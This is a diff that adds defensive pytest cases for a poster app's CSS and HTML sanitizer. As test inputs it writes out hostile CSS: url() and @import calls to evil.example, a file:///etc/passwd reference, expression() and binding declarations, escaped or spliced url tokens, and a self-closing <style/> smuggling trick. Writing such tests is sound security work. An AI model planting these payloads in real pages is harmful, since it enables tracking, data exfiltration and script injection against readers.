@@ -3,10 +3,26 @@
 from __future__ import annotations
 
 import hashlib
+import re
 
 from app.DeepAgent.agents.poster_agent import PosterGenerationAgent
 from app.DeepAgent.agents.poster_composition_agent import PosterCompositionAgent
-from app.DeepAgent.poster.sanitizer import sanitize_poster_markup
+from app.DeepAgent.poster.sanitizer import sanitize_css, sanitize_poster_markup
+
+# Every stylesheet below carries this declaration so each case can assert both
+# halves of the contract: the dangerous part is gone AND the stylesheet is still
+# there. Asserting only the first misses over-blocking, which cost the poster its
+# whole <style> block; asserting only the second misses the security boundary.
+_CANARY = "color:#123456"
+_STYLE_BODY_RE = re.compile(r"<style>(.*)</style>", re.DOTALL)
+
+
+def _sanitized_stylesheet(css: str) -> str:
+    """Return what the poster sanitizer left inside <style>."""
+    sanitized = sanitize_poster_markup(f"<style>{css}</style>")
+    body = _STYLE_BODY_RE.search(sanitized)
+    assert body is not None, "the <style> element itself has to survive"
+    return body.group(1)
 
 
 def test_static_svg_and_data_image_sources_survive_poster_sanitization() -> None:
@@ -346,3 +362,216 @@ def test_agent_supplied_quality_keys_outside_the_allowlist_never_reach_the_respo
     assert "/tmp/private" not in str(result["quality"])
     # 필터가 해시 비교를 앞지르면 안 된다: 바이트가 그대로면 점수는 살아남는다.
     assert result["quality"]["validation_score"] == 0.9
+
+
+def test_local_fragment_urls_survive_a_style_block() -> None:
+    """SVG paint, mask and clip references have no network capability at all.
+
+    The attribute path already keeps url(#gradient); a stylesheet saying the same
+    thing has to be judged the same way.
+    """
+    kept = _sanitized_stylesheet(
+        f".node{{fill:url(#gradient);mask:url(#m);clip-path:url(#c);{_CANARY}}}"
+    )
+
+    assert "fill:url(#gradient)" in kept
+    assert "mask:url(#m)" in kept
+    assert "clip-path:url(#c)" in kept
+    assert _CANARY in kept
+
+
+def test_inline_raster_data_url_survives_a_style_block() -> None:
+    kept = _sanitized_stylesheet(
+        f".node{{background:url(data:image/png;base64,AAAA);{_CANARY}}}"
+    )
+
+    assert "url(data:image/png;base64,AAAA)" in kept
+    assert _CANARY in kept
+
+
+def test_the_word_url_inside_a_css_comment_costs_nothing() -> None:
+    kept = _sanitized_stylesheet(f"/* no external url(s) allowed */.node{{{_CANARY}}}")
+
+    assert "no external url(s) allowed" in kept
+    assert _CANARY in kept
+
+
+def test_a_url_inside_a_css_string_literal_costs_nothing() -> None:
+    """Text inside a string is not a url token to the browser either."""
+    kept = _sanitized_stylesheet(f".node{{content:'url(';{_CANARY}}}")
+
+    assert "content:'url('" in kept
+    assert _CANARY in kept
+
+
+def test_scroll_behavior_is_not_mistaken_for_the_behavior_property() -> None:
+    """behavior: attaches script; scroll-behavior: is ordinary layout."""
+    kept = _sanitized_stylesheet(f".node{{scroll-behavior:smooth;{_CANARY}}}")
+
+    assert "scroll-behavior:smooth" in kept
+    assert _CANARY in kept
+
+
+def test_page_sizing_survives_a_stylesheet_that_paints_with_a_gradient() -> None:
+    """The product bug: one url(#grad) used to cost the poster its @page rule,
+    and with it the A3 geometry the PDF export is held to."""
+    kept = _sanitized_stylesheet(
+        f"@page{{size:A3 landscape;margin:0}}.node{{fill:url(#grad);{_CANARY}}}"
+    )
+
+    assert "@page{size:A3 landscape;margin:0}" in kept
+    assert "fill:url(#grad)" in kept
+    assert _CANARY in kept
+
+
+def test_network_urls_are_removed_without_dropping_the_stylesheet() -> None:
+    for target in (
+        "http://evil.example/b.png",
+        "https://evil.example/b.png",
+        "//evil.example/b.png",
+        "/abs/b.png",
+        "../rel/b.png",
+        "file:///etc/passwd",
+        # An SVG document can carry script, so it stays out of the raster allowance.
+        "data:image/svg+xml;base64,AAAA",
+    ):
+        kept = _sanitized_stylesheet(f".node{{background:url({target});{_CANARY}}}")
+
+        assert target not in kept, target
+        assert "url(" not in kept, target
+        assert _CANARY in kept, target
+
+
+def test_import_rules_are_removed_without_dropping_the_stylesheet() -> None:
+    for rule in (
+        "@import url(http://evil.example/x.css);",
+        '@import "http://evil.example/x.css";',
+        "@import url(http://evil.example/x.css) screen;",
+    ):
+        kept = _sanitized_stylesheet(f"{rule}.node{{{_CANARY}}}")
+
+        assert "evil.example" not in kept, rule
+        assert "@import" not in kept, rule
+        assert _CANARY in kept, rule
+
+
+def test_image_set_is_removed_without_dropping_the_stylesheet() -> None:
+    for call in (
+        'image-set("http://evil.example/b.png" 1x)',
+        "-webkit-image-set('http://evil.example/b.png' 1x)",
+    ):
+        kept = _sanitized_stylesheet(f".node{{background-image:{call};{_CANARY}}}")
+
+        assert "evil.example" not in kept, call
+        assert "image-set" not in kept.lower(), call
+        assert _CANARY in kept, call
+
+
+def test_active_content_declarations_are_removed_without_dropping_the_stylesheet() -> None:
+    for declaration in (
+        "width:expression(alert(1))",
+        # A local fragment is not safe here: an XBL binding runs script.
+        "-moz-binding:url(#evil)",
+        "behavior:url(#default#time2)",
+    ):
+        kept = _sanitized_stylesheet(f".node{{{declaration};{_CANARY}}}")
+
+        assert "expression(" not in kept.lower(), declaration
+        assert "-moz-binding" not in kept.lower(), declaration
+        assert "behavior" not in kept.lower(), declaration
+        assert "url(" not in kept, declaration
+        assert _CANARY in kept, declaration
+
+
+def test_escaped_and_spaced_url_functions_are_removed_without_dropping_the_stylesheet() -> None:
+    for value in (
+        r"u\72l(http://evil.example/b.png)",
+        r"\75rl(http://evil.example/b.png)",
+        "U R L ( http://evil.example/b.png )",
+    ):
+        kept = _sanitized_stylesheet(f".node{{background:{value};{_CANARY}}}")
+
+        assert "evil.example" not in kept, value
+        # The escape must not survive either: the browser would decode it back
+        # into the very fetch the check just removed.
+        assert "\\" not in kept, value
+        assert _CANARY in kept, value
+
+
+def test_a_url_token_synthesized_by_removal_is_removed_too() -> None:
+    """Dropping the @import splices ``ur`` onto ``l(`` and makes a live url()."""
+    kept = _sanitized_stylesheet(
+        f".node{{background:ur@import a;l(http://evil.example/b.png);{_CANARY}}}"
+    )
+
+    assert "evil.example" not in kept
+    assert "url(" not in kept
+    assert _CANARY in kept
+
+
+def test_css_that_keeps_resynthesizing_url_tokens_loses_its_stylesheet() -> None:
+    """Fail-closed: input that will not converge is dropped whole, not shipped."""
+    nested = "ur" * 6 + "@import a;" + "l(x)" * 5 + "l(http://evil.example)"
+
+    assert _sanitized_stylesheet(f".node{{{_CANARY};background:{nested}}}") == ""
+
+
+def test_sanitized_css_is_a_fixpoint_of_the_sanitizer() -> None:
+    """What was inspected is what is returned.
+
+    Sanitizing the output again must change nothing -- otherwise some escape or
+    splice survived the check and the browser could still decode it into a fetch.
+    """
+    for css in (
+        f".node{{fill:url(#gradient);{_CANARY}}}",
+        f".node{{background:url(http://evil.example/b.png);{_CANARY}}}",
+        r".node{background:u\72l(http://evil.example/b.png)}",
+        f".node{{content:'url(';{_CANARY}}}",
+        f"@import url(http://evil.example/x.css);.node{{{_CANARY}}}",
+        f".node{{background:ur@import a;l(http://evil.example/b.png);{_CANARY}}}",
+    ):
+        once = sanitize_css(css)
+
+        assert sanitize_css(once) == once, css
+
+
+def test_a_self_closing_style_tag_cannot_smuggle_css_past_the_sanitizer() -> None:
+    """HTMLParser sends <style/> to handle_startendtag without entering CDATA
+    mode. Emitting a lone <style> there would leave every following byte as a
+    live stylesheet the sanitizer never read -- and a trailing real <style>
+    block closes it, so the poster still renders while the fetch happens.
+    """
+    sanitized = sanitize_poster_markup(
+        "<style/>"
+        "@import url(http://evil.example/x.css);"
+        "body{background:url(http://evil.example/b.png)}"
+        # CSS ignores <!-- and -->, so an unsanitized comment is a declaration
+        # too once a dangling <style> has opened a stylesheet around it.
+        "<!-- *{background:url(http://evil.example/c.png)} -->"
+        "<style>.real{color:#123456}</style>"
+    )
+
+    assert "<style></style>" in sanitized
+    # Nothing may be left open: the browser reads on to the next </style>.
+    assert sanitized.count("<style>") == sanitized.count("</style>")
+    assert ".real{color:#123456}" in sanitized
+
+
+def test_a_self_closing_title_tag_cannot_swallow_the_rest_of_the_poster() -> None:
+    """<title> is RCDATA, so a dangling one turns the whole poster into its text."""
+    sanitized = sanitize_poster_markup('<title/><h1 id="t">Poster</h1>')
+
+    assert "<title></title>" in sanitized
+    assert '<h1 id="t">Poster</h1>' in sanitized
+
+
+def test_self_closing_svg_shapes_still_render() -> None:
+    """Closing the element must not cost the shapes a poster is drawn with."""
+    sanitized = sanitize_poster_markup(
+        '<svg viewBox="0 0 10 10"><rect width="10" height="10"/><circle r="2"/></svg>'
+    )
+
+    assert "<rect width=\"10\" height=\"10\"></rect>" in sanitized
+    assert '<circle r="2"></circle>' in sanitized
+    # Void elements must not grow a closing tag.
+    assert "</img>" not in sanitize_poster_markup('<img src="data:image/png;base64,AAAA"/>')
